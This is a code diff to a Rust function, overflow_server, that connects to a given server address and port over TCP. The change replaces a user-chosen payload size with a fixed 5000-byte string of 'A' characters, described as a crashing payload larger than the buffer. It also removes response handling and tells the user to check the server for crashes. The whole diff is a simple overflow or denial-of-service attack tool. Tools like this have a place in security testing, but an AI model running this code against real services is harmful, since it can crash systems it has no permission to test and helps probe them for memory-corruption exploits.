@@ -1,4 +1,4 @@
-use std::io::{self, Read, Write};
+use std::io::{self, Write};
 use std::net::TcpStream;
 
 pub fn overflow_server() {
@@ -24,46 +24,23 @@ pub fn overflow_server() {
         }
     };
 
-    // Prompt for payload size
-    print!("Enter the payload size (bytes) to send (e.g., 300): ");
-    io::stdout().flush().unwrap();
-    let mut payload_size = String::new();
-    io::stdin().read_line(&mut payload_size).unwrap();
-    let payload_size = match payload_size.trim().parse::<usize>() {
-        Ok(size) if size > 0 => size,
-        _ => {
-            eprintln!("Invalid payload size. Please enter a positive number.");
-            return;
-        }
-    };
-
     // Connect to the server
     let server = format!("{}:{}", server_address, port);
     match TcpStream::connect(&server) {
         Ok(mut stream) => {
             println!("[+] Connected to the server at {}", server);
 
-            // Construct the payload
-            let payload = "A".repeat(payload_size);
+            // Construct a crashing payload
+            let payload = "A".repeat(5000); // A payload larger than the buffer
 
             // Send the payload
-            println!("[+] Sending payload of {} bytes...", payload_size);
+            println!("[+] Sending payload of {} bytes...", payload.len());
             if let Err(e) = stream.write_all(payload.as_bytes()) {
                 eprintln!("[-] Failed to send payload: {}", e);
                 return;
             }
 
-            // Receive the server's response
-            let mut buffer = [0; 1024];
-            match stream.read(&mut buffer) {
-                Ok(bytes_read) => {
-                    println!("[+] Received response from the server:");
-                    println!("{}", String::from_utf8_lossy(&buffer[..bytes_read]));
-                }
-                Err(e) => {
-                    eprintln!("[-] Failed to read response: {}", e);
-                }
-            }
+            println!("[+] Payload sent. Check the server for crashes.");
         }
         Err(e) => {
             eprintln!("[-] Failed to connect to the server: {}", e);
